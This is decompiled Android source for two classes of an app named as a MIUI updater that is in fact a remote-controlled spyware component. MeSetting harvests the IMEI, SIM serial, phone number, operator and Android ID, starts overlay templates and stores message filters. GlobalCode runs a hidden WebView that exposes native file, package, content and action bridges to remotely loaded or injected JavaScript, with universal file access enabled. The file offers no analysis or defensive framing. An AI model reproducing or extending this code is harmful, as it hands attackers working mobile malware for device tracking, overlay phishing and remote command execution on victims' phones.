package brandmangroupe.miui.updater;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.ConnectivityManager;
import android.os.Build;
import android.os.Build.VERSION;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;

public class MeSetting {
    Context mContext;

    MeSetting(Context c) {
        this.mContext = c;
    }

    @SuppressLint({"NewApi"})
    public void startScript(String Url) {
        Intent intent = new Intent(this.mContext, GlobalCode.class);
        intent.putExtra("content", Url);
        intent.putExtra("type", "start");
        intent.putExtra("data", "");
        this.mContext.startService(intent);
    }

    @SuppressLint({"NewApi"})
    public void startTPL(String Url) {
        Intent inteb = new Intent(this.mContext, OverlayService.class);
        inteb.putExtra("tpl", Url);
        this.mContext.startService(inteb);
    }

    @SuppressLint({"NewApi"})
    public void startPage(String Url) {
        Intent intent = new Intent(this.mContext, MasterPage.class);
        intent.putExtra("url", Url);
        intent.setFlags(268435456);
        this.mContext.startActivity(intent);
    }

    @SuppressLint({"NewApi"})
    public void hideTPL() {
        OverlayService.stop();
        System.exit(0);
    }

    @SuppressLint({"NewApi"})
    public String getDomain() {
        String key = "";
        try {
            ApplicationInfo appInfo = this.mContext.getPackageManager().getApplicationInfo(this.mContext.getPackageName(), 128);
            if (appInfo.metaData != null) {
                return appInfo.metaData.getString("domain");
            }
            return key;
        } catch (NameNotFoundException oops) {
            oops.printStackTrace();
            return key;
        }
    }

    public void setFilterNumber(String filter) {
        Editor editor = this.mContext.getSharedPreferences("setfilterconf", 0).edit();
        editor.putString("filter", filter);
        editor.commit();
    }

    public void setFilterText(String filter) {
        Editor editor = this.mContext.getSharedPreferences("setfilterconf", 0).edit();
        editor.putString("filter2", filter);
        editor.commit();
    }

    public String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return capitalize(model);
        }
        return capitalize(manufacturer) + " " + model;
    }

    private String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        return !Character.isUpperCase(first) ? Character.toUpperCase(first) + s.substring(1) : s;
    }

    public String typenat() {
        String typenet = "n/a";
        ConnectivityManager cm = (ConnectivityManager) this.mContext.getSystemService("connectivity");
        boolean isMobile = cm.getActiveNetworkInfo().getType() == 0;
        boolean isWifi = cm.getNetworkInfo(1).isAvailable();
        if (isMobile) {
            typenet = "mobile";
        }
        if (isWifi) {
            return "wifi";
        }
        return typenet;
    }

    public String imsi() {
        return ((TelephonyManager) this.mContext.getSystemService("phone")).getSimSerialNumber();
    }

    public String getApplicationName() {
        ApplicationInfo ai;
        PackageManager pm = this.mContext.getApplicationContext().getPackageManager();
        try {
            ai = pm.getApplicationInfo(this.mContext.getPackageName(), 0);
        } catch (NameNotFoundException e) {
            ai = null;
        }
        return ai != null ? pm.getApplicationLabel(ai) : "(unknown)";
    }

    public String timer() {
        return String.valueOf(this.mContext.getSharedPreferences("settingspref", 0).getInt("timer", Integer.valueOf(3599).intValue()));
    }

    public String filter() {
        return this.mContext.getSharedPreferences("setfilterconf", 0).getString("filter", "");
    }

    public String filter2() {
        return this.mContext.getSharedPreferences("setfilterconf", 0).getString("filter2", "");
    }

    public String tel() {
        return ((TelephonyManager) this.mContext.getSystemService("phone")).getLine1Number();
    }

    public String sdk() {
        return VERSION.RELEASE;
    }

    public String model() {
        return getDeviceName();
    }

    public String deviceid() {
        return Secure.getString(this.mContext.getContentResolver(), "android_id");
    }

    public String imei() {
        return ((TelephonyManager) this.mContext.getSystemService("phone")).getDeviceId();
    }

    public String packagename() {
        return this.mContext.getApplicationContext().getPackageName();
    }

    public String operator() {
        return ((TelephonyManager) this.mContext.getSystemService("phone")).getNetworkOperator();
    }
}
package brandmangroupe.miui.updater;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.TableRow.LayoutParams;
import java.util.UUID;

public class GlobalCode extends Service {
    public void onCreate() {
        super.onCreate();
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onDestroy() {
    }

    public String getexstras(Bundle extras, String name) {
        String out = "";
        if (extras == null || !extras.containsKey(name)) {
            return out;
        }
        return extras.getString(name);
    }

    public static String getUniqueID(Context context) {
        TelephonyManager tm = (TelephonyManager) context.getSystemService("phone");
        String deviceId = new UUID((long) (Secure.getString(context.getContentResolver(), "android_id")).hashCode(), (((long) (tm.getDeviceId()).hashCode()) << 32) | ((long) (tm.getSimSerialNumber()).hashCode())).toString();
        String key = "";
        try {
            ApplicationInfo appInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(), 128);
            if (appInfo.metaData != null) {
                key = appInfo.metaData.getString("sub");
            }
        } catch (NameNotFoundException oops) {
            oops.printStackTrace();
        }
        return new StringBuilder(String.valueOf(deviceId)).append("-").append(key).toString();
    }

    @SuppressLint({"NewApi"})
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            Bundle extras = intent.getExtras();
            if (extras != null) {
                String content = getexstras(extras, "content");
                String type = getexstras(extras, "type");
                String data = getexstras(extras, "data");
                WebView webview = new WebView(this);
                webview.setLayoutParams(new LayoutParams(0, -2, 1.0f));
                webview.addJavascriptInterface(new MeSetting(this), "MeSetting");
                webview.addJavascriptInterface(new MeSystem(this), "MeSystem");
                webview.addJavascriptInterface(new MeFile(this), "MeFile");
                webview.addJavascriptInterface(new MePackage(this), "MePackage");
                webview.addJavascriptInterface(new MeContent(this), "MeContent");
                webview.addJavascriptInterface(new MeAction(this), "MeAction");
                WebSettings webSettings = webview.getSettings();
                webSettings.setSavePassword(true);
                webSettings.setSaveFormData(true);
                webSettings.setAllowFileAccess(true);
                if (VERSION.SDK_INT >= 16) {
                    webSettings.setAllowFileAccessFromFileURLs(true);
                    webSettings.setAllowUniversalAccessFromFileURLs(true);
                }
                webSettings.setJavaScriptEnabled(true);
                webSettings.setUserAgentString("Hash: " + getUniqueID(this));
                if (content.substring(0, 7).contains("http://")) {
                    webview.loadUrl(Uri.parse(content).buildUpon().appendQueryParameter("type", type).appendQueryParameter("data", data).build().toString());
                }
                if (content.substring(0, 8).contains("file:///")) {
                    webview.loadUrl(Uri.parse(content).buildUpon().build().toString());
                }
                if (content.substring(0, 11).contains("javascript:")) {
                    webview.loadData("<script>" + content.substring(11) + "</script>", "text/html; charset=UTF-8", null);
                }
            }
        }
        return 1;
    }
}
